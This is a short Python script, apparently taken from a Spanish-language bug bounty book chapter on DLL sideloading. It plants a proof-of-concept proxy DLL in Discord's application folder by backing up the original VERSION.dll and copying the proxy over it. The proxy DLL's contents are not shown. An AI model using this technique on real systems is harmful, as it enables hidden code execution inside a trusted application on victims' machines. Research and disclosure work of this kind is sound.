# Extraído de: LibroBugBounty/cap-06-dll-sideloading.md
# Script de despliegue del PoC para Discord
# (modelo local, pre-disclosure)
import shutil
from pathlib import Path

def deploy_poc(discord_dir: str, proxy_dll: str):
    """Despliega la proxy DLL en el directorio de Discord."""
    target = Path(discord_dir)

    # Renombrar original
    original = target / "VERSION.dll"
    backup = target / "VERSION_orig.dll"

    if original.exists() and not backup.exists():
        shutil.copy2(str(original), str(backup))

    # Colocar proxy
    shutil.copy2(proxy_dll, str(target / "VERSION.dll"))

    return {
        "original_backed_up": backup.exists(),
        "proxy_deployed": (target / "VERSION.dll").exists(),
        "target_dir": str(target),
    }

# deploy_poc(
#     r"C:\Users\researcher\AppData\Local\Discord\app-1.0.9045",
#     r"C:\research\proxy_version.dll"
# )
